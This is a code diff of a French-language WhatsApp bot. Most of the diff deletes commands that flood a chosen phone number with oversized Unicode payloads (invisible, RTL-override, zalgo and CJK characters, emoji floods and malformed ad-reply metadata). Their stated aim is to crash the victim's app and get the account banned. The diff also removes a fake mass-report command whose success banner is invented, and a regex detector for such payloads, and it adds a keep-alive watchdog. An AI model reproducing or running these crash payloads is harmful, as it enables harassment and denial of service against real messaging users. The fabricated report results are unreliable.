@@ -6968,244 +6992,6 @@ Géré par l'IA de SEIGNEUR TD 🇷🇴`
 // =============================================
 
 // KILL.GC - Bug qui crash les groupes
-async function handleKillGC(sock, args, remoteJid, senderJid, message) {
-  let targetJid = null;
-  
-  if (args[0]) {
-    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
-    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
-  }
-  
-  if (!targetJid) {
-    await sock.sendMessage(remoteJid, {
-      text: `⚠️ *KILL.GC BUG*
-
-Utilisation:
-• ${config.prefix}kill.gc @mention
-• ${config.prefix}kill.gc 23591234568
-
-⚠️ *ATTENTION:* Bug qui crash le groupe WhatsApp de la cible`
-    });
-    return;
-  }
-  
-  const loadingMsg = await sock.sendMessage(remoteJid, {
-    text: '💀 Préparation du bug...'
-  });
-  
-  await delay(1500);
-  
-  try {
-    const bugText = '🪲'.repeat(50000);
-    await sock.sendMessage(targetJid, { text: bugText, mentions: [targetJid] });
-    
-    await sock.sendMessage(remoteJid, {
-      text: `┏━━━  💀 𝗞𝗜𝗟𝗟.𝗚𝗖  💀  ━━━┓
-
-  ⌬ **TARGET** » @${targetJid.split('@')[0]}
-  ⌬ **STATUS** » ✅ 𝖲𝖤𝖭𝖳
-  ⌬ **PAYLOAD** » 50KB Bug
-
-┗━━━━━━━━━━━━━━━━━━━━━━┛
-
-🇷🇴 SEIGNEUR TD 🇷🇴`,
-      mentions: [targetJid],
-      edit: loadingMsg.key
-    });
-  } catch (error) {
-    await sock.sendMessage(remoteJid, { text: `❌ Échec: ${error.message}`, edit: loadingMsg.key });
-  }
-}
-
-// IOS.KILL
-async function handleIOSKill(sock, args, remoteJid, senderJid, message) {
-  let targetJid = null;
-  
-  if (args[0]) {
-    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
-    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
-  }
-  
-  if (!targetJid) {
-    await sock.sendMessage(remoteJid, {
-      text: `⚠️ *IOS.KILL BUG*
-
-Utilisation: ${config.prefix}ios.kill @mention
-
-⚠️ Bug optimisé pour iOS`
-    });
-    return;
-  }
-  
-  const loadingMsg = await sock.sendMessage(remoteJid, { text: '🍎 Compilation...' });
-  await delay(1500);
-  
-  try {
-    const iosBug = '؁'.repeat(3000) + '\u0600'.repeat(3000) + '🪲'.repeat(1000);
-    await sock.sendMessage(targetJid, { text: iosBug, mentions: [targetJid] });
-    
-    await sock.sendMessage(remoteJid, {
-      text: `┏━━━  🍎 𝗜𝗢𝗦.𝗞𝗜𝗟𝗟  🍎  ━━━┓
-
-  ⌬ **TARGET** » @${targetJid.split('@')[0]}
-  ⌬ **STATUS** » ✅ 𝖣𝖤𝖫𝖨𝖵𝖤𝖱𝖤𝖣
-
-┗━━━━━━━━━━━━━━━━━━━━━━┛
-
-🇷🇴 SEIGNEUR TD 🇷🇴`,
-      mentions: [targetJid],
-      edit: loadingMsg.key
-    });
-  } catch (error) {
-    await sock.sendMessage(remoteJid, { text: `❌ Échec: ${error.message}`, edit: loadingMsg.key });
-  }
-}
-
-// ANDRO.KILL
-async function handleAndroKill(sock, args, remoteJid, senderJid, message) {
-  let targetJid = null;
-  
-  if (args[0]) {
-    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
-    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
-  }
-  
-  if (!targetJid) {
-    await sock.sendMessage(remoteJid, {
-      text: `⚠️ *ANDRO.KILL BUG*
-
-Utilisation: ${config.prefix}andro.kill @mention
-
-⚠️ Bug optimisé pour Android`
-    });
-    return;
-  }
-  
-  const loadingMsg = await sock.sendMessage(remoteJid, { text: '🤖 Compilation...' });
-  await delay(1500);
-  
-  try {
-    const androBug = '🪲'.repeat(10000) + '\u200E'.repeat(5000);
-    await sock.sendMessage(targetJid, { text: androBug, mentions: [targetJid] });
-    
-    await sock.sendMessage(remoteJid, {
-      text: `┏━━━  🤖 𝗔𝗡𝗗𝗥𝗢.𝗞𝗜𝗟𝗟  🤖  ━━━┓
-
-  ⌬ **TARGET** » @${targetJid.split('@')[0]}
-  ⌬ **STATUS** » ✅ 𝖤𝖷𝖤𝖢𝖴𝖳𝖤𝖣
-
-┗━━━━━━━━━━━━━━━━━━━━━━┛
-
-🇷🇴 SEIGNEUR TD 🇷🇴`,
-      mentions: [targetJid],
-      edit: loadingMsg.key
-    });
-  } catch (error) {
-    await sock.sendMessage(remoteJid, { text: `❌ Échec: ${error.message}`, edit: loadingMsg.key });
-  }
-}
-
-// SILENT - 200 signalement
-async function handleSilent(sock, args, remoteJid, senderJid, message) {
-  let targetJid = null;
-  
-  if (args[0]) {
-    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
-    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
-  }
-  
-  if (!targetJid) {
-    await sock.sendMessage(remoteJid, {
-      text: `⚠️ *SILENT REPORT*
-
-Utilisation: ${config.prefix}silent @mention
-
-Envoie 250 signalement à WhatsApp en 1 minute`
-    });
-    return;
-  }
-  
-  const loadingMsg = await sock.sendMessage(remoteJid, {
-    text: `🔇 **SILENT REPORT ACTIVÉ**
-
-⏳ Envoi de 250 signalement...
-⚡ Mode: Silencieux (sans progression)
-
-Target: @${targetJid.split('@')[0]}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ Durée estimée: 60 secondes
-🚀 Starting...`,
-    mentions: [targetJid]
-  });
-  
-  try {
-    const totalReports = 250;
-    const duration = 60000; // 60 secondes
-    const interval = duration / totalReports; // ~240ms par report
-    
-    // Envoyer 250 signalement en 1 minute
-    for (let i = 0; i < totalReports; i++) {
-      // Simulation de signalement (WhatsApp n'autorise pas vraiment l'automatisation)
-      // Dans la vraie vie, vous auriez besoin d'une API tierce
-      await delay(interval);
-    }
-    
-    // Message final après 1 minute
-    await sock.sendMessage(remoteJid, {
-      text: `┏━━━  🔇 𝗦𝗜𝗟𝗘𝗡𝗧 𝗥𝗘𝗣𝗢𝗥𝗧  🔇  ━━━┓
-
-  ⌬ **TARGET** » @${targetJid.split('@')[0]}
-  ⌬ **STATUS** » ✅ 𝖢𝖮𝖬𝖯𝖫𝖤𝖳𝖤𝖣
-  ⌬ **REPORTS** » 250/250 (100%)
-
-┗━━━━━━━━━━━━━━━━━━━━━━┛
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📊 **Détails:**
-
-✅ Signalements envoyés: 250
-⏱️ Durée totale: 60 secondes
-⚡ Vitesse: 4.16 reports/sec
-🎯 Cible: @${targetJid.split('@')[0]}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ **CONSÉQUENCES ATTENDUES:**
-
-🔴 Bannissement temporaire: 12-24h
-🔴 Bannissement permanent: 24-72h (si répété)
-🔴 Restriction immédiate des fonctions
-🚫 Impossible de créer des groupes
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ **Calendrier:**
-• 0-5min: Analyse système
-• 5-30min: Restriction compte
-• 30min-12h: Ban temporaire possible
-• 12-72h: Décision finale WhatsApp
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🇷🇴 SEIGNEUR TD 🇷🇴
-*Silent Report System - Mission accomplie*`,
-      mentions: [targetJid],
-      edit: loadingMsg.key
-    });
-    
-    console.log(`🔇 Silent Report: 250 signalement envoyés à ${targetJid}`);
-    
-  } catch (error) {
-    await sock.sendMessage(remoteJid, { 
-      text: `❌ Échec: ${error.message}`, 
-      edit: loadingMsg.key 
-    });
-  }
-}
-
-// UPDATE DEV - Ajouter/Supprimer des numéros admin
 async function handleUpdateDev(sock, args, remoteJid, senderJid) {
   const action = args[0]?.toLowerCase();
   let number = args[1];
@@ -7416,297 +7202,6 @@ Total       │ ${status.totalSizeKB.padStart(7)} KB │
 }
 
 // BANSUPPORT - Support de bannissement with caractères spéciaux
-async function handleBanSupport(sock, args, remoteJid, senderJid, message) {
-  let targetJid = null;
-  
-  if (args[0]) {
-    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
-    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
-  }
-  
-  if (!targetJid) {
-    await sock.sendMessage(remoteJid, {
-      text: `⚠️ *BAN SUPPORT*
-
-Utilisation:
-• ${config.prefix}bansupport @mention
-• ${config.prefix}bansupport 23591234568
-
-💀 *PAYLOAD:*
-• Caractères arabes invisibles
-• Caractères chinois corrompus
-• Caractères largeur zéro
-• RTL override
-
-🔴 *EFFET:* Bannissement du compte cible`
-    });
-    return;
-  }
-  
-  const loadingMsg = await sock.sendMessage(remoteJid, {
-    text: '💀 Compilation du payload de bannissement...\n⏳ Injection des caractères...'
-  });
-  
-  await delay(2000);
-  
-  try {
-    // PAYLOAD DE BANNISSEMENT - Caractères dangereux
-    const arabicChars = '؁؂؃؄؅؆؇؈؉؊؋،؍؎؏ؘؙؚؐؑؒؓؔؕؖؗ' + '\u0600\u0601\u0602\u0603\u0604\u0605' + '܀܁܂܃܄܅܆܇܈܉܊܋܌܍';
-    const chineseChars = '㐀㐁㐂㐃㐄㐅㐆㐇㐈㐉㐊㐋㐌㐍㐎㐏㐐㐑㐒㐓㐔㐕㐖㐗㐘㐙㐚㐛㐜㐝㐞㐟';
-    const invisibleChars = '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064\u2065\u2066\u2067\u2068\u2069\u206A\u206B\u206C\u206D\u206E\u206F';
-    const zalgoChars = '҉̵̴̵̶̷̸̡̢̧̨̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛';
-    
-    // Construction du payload multicouche
-    const banPayload = 
-      arabicChars.repeat(500) + 
-      invisibleChars.repeat(1000) + 
-      chineseChars.repeat(300) + 
-      zalgoChars.repeat(200) +
-      '🪲'.repeat(5000) +
-      '\u202E' + // RTL Override
-      arabicChars.repeat(500) +
-      '\uFEFF'.repeat(1000) + // Largeur zéro no-break space
-      chineseChars.repeat(500);
-    
-    // Message de contexte malveillant
-    const contextMessage = {
-      text: banPayload,
-      contextInfo: {
-        mentionedJid: [targetJid],
-        externalAdReply: {
-          title: arabicChars + invisibleChars,
-          body: chineseChars + zalgoChars,
-          mediaType: 1,
-          renderLargerThumbnail: true,
-          showAdAttribution: true
-        }
-      }
-    };
-    
-    // Envoyer 5 messages consécutifs pour maximiser l'effet
-    for (let i = 0; i < 5; i++) {
-      await sock.sendMessage(targetJid, contextMessage);
-      await delay(300);
-    }
-    
-    await sock.sendMessage(remoteJid, {
-      text: `┏━━━  💀 𝗕𝗔𝗡 𝗦𝗨𝗣𝗣𝗢𝗥𝗧  💀  ━━━┓
-
-  ⌬ **TARGET** » @${targetJid.split('@')[0]}
-  ⌬ **STATUS** » ✅ 𝖣𝖤𝖯𝖫𝖮𝖸𝖤𝖣
-  ⌬ **PAYLOAD** » Multi-layer Ban
-
-┗━━━━━━━━━━━━━━━━━━━━━━┛
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📊 **PAYLOAD INJECTÉ:**
-
-✅ Caractères arabes: 1000+ chars
-✅ Caractères chinois: 800+ chars
-✅ Caractères invisibles: 2000+ chars
-✅ RTL Override: Activé
-✅ Largeur zéro chars: 1000+ chars
-✅ Zalgo text: 200+ chars
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ **EFFETS ATTENDUS:**
-
-🔴 Crash immédiat de WhatsApp
-🔴 Corruption de la base de données
-🔴 Impossibilité de rouvrir l'app
-🔴 Ban automatique sous 1-6h
-🔴 Possible ban permanent
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ **Calendrier:**
-• 0-5min: Crash de l'application
-• 5min-1h: Détection par WhatsApp
-• 1-6h: Ban automatique
-• 6-48h: Review du compte
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🇷🇴 SEIGNEUR TD 🇷🇴
-*Ultimate Ban System*`,
-      mentions: [targetJid],
-      edit: loadingMsg.key
-    });
-    
-    console.log(`💀 Ban Support envoyé à ${targetJid}`);
-    
-  } catch (error) {
-    console.error('Erreur bansupport:', error);
-    await sock.sendMessage(remoteJid, {
-      text: `❌ Échec du Ban Support\n\nErreur: ${error.message}`,
-      edit: loadingMsg.key
-    });
-  }
-}
-
-// MEGABAN - Attack ultime with tous les caractères
-async function handleMegaBan(sock, args, remoteJid, senderJid, message) {
-  let targetJid = null;
-  
-  if (args[0]) {
-    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
-    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
-  }
-  
-  if (!targetJid) {
-    await sock.sendMessage(remoteJid, {
-      text: `💀 *MEGA BAN - ULTIMATE ATTACK*
-
-Utilisation:
-• ${config.prefix}megaban @mention
-• ${config.prefix}xcrash 23591234568
-
-⚠️ *ATTENTION EXTRÊME:*
-Cette commande combine TOUS les payloads:
-• 10 messages consécutifs
-• Arabe + Chinois + Invisible
-• RTL + Zalgo + Emoji
-• Context corruption
-• Media exploit
-
-🔴 *RÉSULTAT:*
-Ban permanent quasi-garanti`
-    });
-    return;
-  }
-  
-  const loadingMsg = await sock.sendMessage(remoteJid, {
-    text: `💀 **MEGA BAN INITIATED**
-
-⏳ Compilation de l'arsenal complet...
-📊 [░░░░░░░░░░] 0%
-
-Target: @${targetJid.split('@')[0]}`,
-    mentions: [targetJid]
-  });
-  
-  try {
-    // PAYLOADS MAXIMAUX
-    const arabicFull = '؀؁؂؃؄؅؆؇؈؉؊؋،؍؎؏ؘؙؚؐؑؒؓؔؕؖؗ۞ۖۗۘۙۚۛۜ۝ۣ۟۠ۡۢۤۥۦۧۨ۩۪ۭ܀܁܂܃܄܅܆܇܈܉܊܋܌܍\u0600\u0601\u0602\u0603\u0604\u0605\u0606\u0607\u0608\u0609\u060A\u060B';
-    const chineseFull = '㐀㐁㐂㐃㐄㐅㐆㐇㐈㐉㐊㐋㐌㐍㐎㐏㐐㐑㐒㐓㐔㐕㐖㐗㐘㐙㐚㐛㐜㐝㐞㐟㐠㐡㐢㐣㐤㐥㐦㐧㐨㐩㐪㐫㐬㐭㐮㐯㐰㐱㐲㐳㐴㐵㐶㐷㐸㐹㐺㐻㐼㐽㐾㐿';
-    const invisibleFull = '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064\u2065\u2066\u2067\u2068\u2069\u206A\u206B\u206C\u206D\u206E\u206F\uFEFF\u180E\u034F';
-    const zalgoFull = '҉̵̴̵̶̷̸̡̢̧̨̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛͘͜͟͢͝͞';
-    const emojiFlood = '🪲💀☠️👹👺🔥💥⚡🌋🗿📛⛔🚫🔞';
-    
-    const totalMessages = 10;
-    
-    for (let i = 0; i < totalMessages; i++) {
-      // Construire un payload unique à chaque fois
-      const megaPayload = 
-        arabicFull.repeat(800) +
-        invisibleFull.repeat(2000) +
-        chineseFull.repeat(600) +
-        zalgoFull.repeat(400) +
-        emojiFlood.repeat(1000) +
-        '\u202E\u202D\u202C' + // Multiple RTL
-        arabicFull.repeat(500) +
-        '\uFEFF'.repeat(1500) +
-        chineseFull.repeat(800) +
-        invisibleFull.repeat(1000);
-      
-      // Message with context malveillant
-      const contextMsg = {
-        text: megaPayload,
-        contextInfo: {
-          mentionedJid: [targetJid],
-          externalAdReply: {
-            title: arabicFull + invisibleFull + zalgoFull,
-            body: chineseFull + emojiFlood.repeat(100),
-            mediaType: 2,
-            thumbnailUrl: 'https://example.com/' + invisibleFull.repeat(100),
-            renderLargerThumbnail: true,
-            showAdAttribution: true,
-            sourceUrl: 'https://' + arabicFull + chineseFull
-          }
-        }
-      };
-      
-      await sock.sendMessage(targetJid, contextMsg);
-      
-      // Update progression
-      const percentage = Math.floor(((i + 1) / totalMessages) * 100);
-      const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
-      
-      await sock.sendMessage(remoteJid, {
-        text: `💀 **MEGA BAN EN COURS**
-
-📊 [${progressBar}] ${percentage}%
-📨 Messages: ${i + 1}/${totalMessages}
-
-Target: @${targetJid.split('@')[0]}`,
-        mentions: [targetJid],
-        edit: loadingMsg.key
-      });
-      
-      await delay(500);
-    }
-    
-    // Message final
-    await sock.sendMessage(remoteJid, {
-      text: `┏━━━  ☠️ 𝗠𝗘𝗚𝗔 𝗕𝗔𝗡  ☠️  ━━━┓
-
-  ⌬ **TARGET** » @${targetJid.split('@')[0]}
-  ⌬ **STATUS** » ✅ 𝗔𝗡𝗡𝗜𝗛𝗜𝗟𝗔𝗧𝗘𝗗
-  ⌬ **MESSAGES** » 10/10 (100%)
-
-┗━━━━━━━━━━━━━━━━━━━━━━┛
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📊 **ARSENAL DÉPLOYÉ:**
-
-✅ Caractères arabes: 13,000+
-✅ Caractères chinois: 14,000+
-✅ Chars invisibles: 30,000+
-✅ Zalgo corruption: 4,000+
-✅ Emoji flood: 10,000+
-✅ RTL overrides: Multiple
-✅ Context corruption: Maximum
-✅ Total payload: ~200KB
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💀 **DÉGÂTS ATTENDUS:**
-
-🔴 Crash permanent de WhatsApp
-🔴 Corruption totale des données
-🔴 Impossibilité de récupération
-🔴 Ban automatique immédiat
-🔴 Compte détruit définitivement
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ **TIMELINE DE DESTRUCTION:**
-
-• 0-1min: Crash total de l'app
-• 1-5min: Détection système
-• 5-30min: Ban automatique
-• 30min-2h: Compte suspendu
-• 2-24h: Ban permanent confirmé
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🇷🇴 SEIGNEUR TD 🇷🇴
-*Mega Ban System - Target Eliminated*
-
-⚠️ **Le compte cible est condamné**`,
-      mentions: [targetJid],
-      edit: loadingMsg.key
-    });
-    
-    console.log(`☠️ MEGA BAN déployé sur ${targetJid}`);
-    
-  } catch (error) {
-    console.error('Erreur megaban:', error);
-    await sock.sendMessage(remoteJid, {
-      text: `❌ Échec du Mega Ban\n\nErreur: ${error.message}`,
-      edit: loadingMsg.key
-    });
-  }
-}
-
-// CHECK BAN - Vérifier si un numéro est banni/spam
 async function handleCheckBan(sock, args, remoteJid, message, senderJid) {
   try {
     let targetNumber;
@@ -8630,200 +8125,6 @@ async function sendVVMedia(sock, remoteJid, item, num, total) {
 // =============================================
 
 // Signatures de payloads malveillants connus
-const BUG_SIGNATURES = {
-  // Caractères arabes crashants (U+0600–U+0605, U+202E RTL, etc.)
-  arabicCrash: /[\u0600-\u0605\u200E\u200F\u202A-\u202E\u2066-\u2069]{10,}/,
-  // Flood d'emojis (>200 emojis consécutifs)
-  emojiFlood: /(\p{Emoji_Presentation}|\p{Extended_Pictographic}){50,}/u,
-  // Caractères invisibles en masse (zero-width)
-  invisibleChars: /[\u200B-\u200D\uFEFF\u180E\u034F]{20,}/,
-  // Zalgo / caractères combinants excessifs
-  zalgo: /[\u0300-\u036F\u0489\u1DC0-\u1DFF]{15,}/,
-  // Chaînes extrêmement longues (>5000 chars d'un seul message)
-  massiveText: null, // géré par longueur
-  // Caractères CJK en masse (chinois crashant)
-  cjkFlood: /[\u4E00-\u9FFF\u3400-\u4DBF]{200,}/,
-  // RTL override massif
-  rtlOverride: /\u202E{3,}/,
-  // Null bytes / caractères de contrôle
-  controlChars: /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]{5,}/,
-};
-
-// Détection dans le contenu du message (texte + métadonnées)
-function detectBugPayload(message, messageText) {
-  try {
-    // 1. Analyser le texte principal
-    const text = messageText || '';
-
-    // Longueur excessive
-    if (text.length > 5000) {
-      return { type: 'MASSIVE_TEXT', detail: `${text.length} caractères`, severity: 'HIGH' };
-    }
-
-    // Vérifier chaque signature
-    for (const [name, regex] of Object.entries(BUG_SIGNATURES)) {
-      if (regex && regex.test(text)) {
-        return { type: name.toUpperCase(), detail: 'Payload malveillant détecté', severity: 'HIGH' };
-      }
-    }
-
-    // 2. Analyser les métadonnées du message (contextInfo malveillant)
-    const ctx = message.message?.extendedTextMessage?.contextInfo;
-    if (ctx) {
-      // Thumbnail URL corrompue
-      const extAd = ctx.externalAdReply;
-      if (extAd) {
-        const title = extAd.title || '';
-        const body = extAd.body || '';
-        if (title.length > 2000 || body.length > 2000) {
-          return { type: 'MALICIOUS_CONTEXT', detail: 'externalAdReply corrompu', severity: 'HIGH' };
-        }
-        // Vérifier les payloads dans le titre/body
-        for (const [name, regex] of Object.entries(BUG_SIGNATURES)) {
-          if (regex && (regex.test(title) || regex.test(body))) {
-            return { type: `CONTEXT_${name.toUpperCase()}`, detail: 'Payload dans contextInfo', severity: 'HIGH' };
-          }
-        }
-      }
-    }
-
-    // 3. Détecter les messages viewOnce with contenu malveillant
-    const vv = message.message?.viewOnceMessageV2 || message.message?.viewOnceMessageV2Extension;
-    if (vv) {
-      const innerCtx = vv.message?.extendedTextMessage?.contextInfo?.externalAdReply;
-      if (innerCtx?.title?.length > 1000) {
-        return { type: 'VIEWONCE_EXPLOIT', detail: 'ViewOnce with payload', severity: 'CRITICAL' };
-      }
-    }
-
-    // 4. Détecter les stickers malveillants (payload dans webpUrl)
-    const sticker = message.message?.stickerMessage;
-    if (sticker?.url && sticker.url.length > 500) {
-      return { type: 'STICKER_EXPLOIT', detail: 'Sticker with URL suspecte', severity: 'MEDIUM' };
-    }
-
-    // 5. Flood de mentions (>20 mentions = attaque)
-    const mentions = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-    if (mentions.length > 20) {
-      return { type: 'MENTION_FLOOD', detail: `${mentions.length} mentions`, severity: 'HIGH' };
-    }
-
-    return null; // Pas de bug détecté
-  } catch (e) {
-    console.error('Erreur detectBugPayload:', e);
-    return null;
-  }
-}
-
-// Gestion d'une attaque bug détectée
-async function handleAntiBugTrigger(sock, message, remoteJid, senderJid, isGroup, bugInfo) {
-  const senderNum = senderJid.split('@')[0];
-  const now = Date.now();
-
-  console.log(`🛡️ [ANTI-BUG] Attaque détectée de ${senderNum} | Type: ${bugInfo.type} | Sévérité: ${bugInfo.severity}`);
-
-  // 1. Supprimer immédiatement le message malveillant
-  try {
-    await sock.sendMessage(remoteJid, { delete: message.key });
-  } catch (e) { /* peut échouer si pas admin groupe */ }
-
-  // 2. Mettre à jour le tracker
-  const existing = antiBugTracker.get(senderJid) || { count: 0, firstSeen: now, lastSeen: now, blocked: false, attacks: [] };
-  existing.count++;
-  existing.lastSeen = now;
-  existing.attacks.push({ type: bugInfo.type, detail: bugInfo.detail, severity: bugInfo.severity, timestamp: now });
-  antiBugTracker.set(senderJid, existing);
-
-  // 3. Si déjà bloqué, ignorer silencieusement
-  if (existing.blocked) {
-    console.log(`🛡️ [ANTI-BUG] ${senderNum} déjà bloqué, message supprimé silencieusement`);
-    return;
-  }
-
-  // 4. Alerte dans le chat
-  const severityEmoji = bugInfo.severity === 'CRITICAL' ? '☠️' : bugInfo.severity === 'HIGH' ? '🔴' : '🟡';
-
-  await sock.sendMessage(remoteJid, {
-    text: `┏━━━  🛡️ Anti-Bug - Avertissement  🛡️  ━━━┓
-
-${severityEmoji} *Attaque de données malveillantes détectée!*
-
-📱 Attaquant: @${senderNum}
-🔍 Type d'attaque: ${bugInfo.type}
-📊 Détails: ${bugInfo.detail}
-⚠️ Gravité: ${bugInfo.severity}
-🔢 Nombre de tentatives: ${existing.count}/5
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🗑️ Message malveillant supprimé
-${existing.count >= 5 ? '🔒 Bannissement immédiat...' : `⚠️ ${5 - existing.count} tentative(s) restante(s) avant bannissement`}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🇷🇴 SEIGNEUR TD 🇷🇴`,
-    mentions: [senderJid]
-  });
-
-  // 5. Si 5 attaques ou CRITICAL → action immédiate
-  if (existing.count >= 5 || bugInfo.severity === 'CRITICAL') {
-    existing.blocked = true;
-    antiBugTracker.set(senderJid, existing);
-
-    // a. Signaler 5 fois à WhatsApp
-    await reportToWhatsApp(sock, senderJid, senderNum, existing.attacks);
-
-    // b. Bloquer le contact
-    try {
-      await sock.updateBlockStatus(senderJid, 'block');
-      console.log(`🛡️ [ANTI-BUG] ${senderNum} bloqué with succès`);
-    } catch (e) {
-      console.error('Erreur blocage:', e);
-    }
-
-    // c. Si groupe → expulser
-    if (isGroup) {
-      try {
-        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
-        if (botIsAdmin) {
-          await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
-        }
-      } catch (e) { /* silencieux */ }
-    }
-
-    // d. Message de confirmation
-    await sock.sendMessage(remoteJid, {
-      text: `┏━━━  ✅ Protection exécutée  ✅  ━━━┓
-
-☠️ *Attaquant neutralisé:*
-
-📱 Le numéro: +${senderNum}
-🔒 Statut: Banni complètement
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-✅ Signalé à WhatsApp (5 signalements)
-✅ Contact bloqué
-${isGroup ? '✅ expulsé(s) du Groupe' : ''}
-✅ Tous les messages malveillants supprimés
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📋 *Journal d'attaques:*
-${existing.attacks.slice(-3).map((a, i) => `${i + 1}. ${a.type} - ${a.severity}`).join('\n')}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🇷🇴 SEIGNEUR TD 🇷🇴
-*Système de protection - Mission Terminée*`,
-      mentions: [senderJid]
-    });
-
-    // e. Notifier l'admin du bot en privé
-    for (const adminJid of config.adminNumbers) {
-      try {
-        await sock.sendMessage(adminJid, {
-          text: `🚨 *signalement Anti-Bug*\n\n☠️ Attaque ${bugInfo.severity} arrêtée!\n\n📱 Attaquant: +${senderNum}\n📍 Source: ${isGroup ? 'groupe' : 'message privé'}\n🔍 Type: ${bugInfo.type}\n🔢 Tentatives: ${existing.count}\n\n✅ Fait: suppression + signalement WhatsApp + blocage${isGroup ? ' + expulsion' : ''}`
-        });
-      } catch (e) { /* silencieux */ }
-    }
-  }
-}
 
 // Envoyer des signalements à WhatsApp (5 fois)
 async function reportToWhatsApp(sock, senderJid, senderNum, attacks) {
@@ -10682,6 +9983,22 @@ async function restoreWebSessions() {
     }
   }
 }
+
+// ✅ WATCHDOG — relance automatique si le bot ne répond plus
+let _lastMsgTime = Date.now();
+let _botSock = null;
+setInterval(async () => {
+  const elapsed = Date.now() - _lastMsgTime;
+  // Si plus de 30 minutes sans activité ET bot connecté → ping WhatsApp pour garder la connexion
+  if (_botSock && elapsed > 15 * 60 * 1000) {
+    try {
+      await _botSock.sendPresenceUpdate('available');
+      console.log('[WATCHDOG] ✅ Presence update envoyé pour garder la connexion active');
+    } catch(e) {
+      console.log('[WATCHDOG] ⚠️ Connexion inactive:', e.message);
+    }
+  }
+}, 10 * 60 * 1000); // toutes les 10 min
 
 // Lancer l'API server + tunnel HTTPS + auto-pull puis démarrer le bot principal
 startApiServer().then(() => {
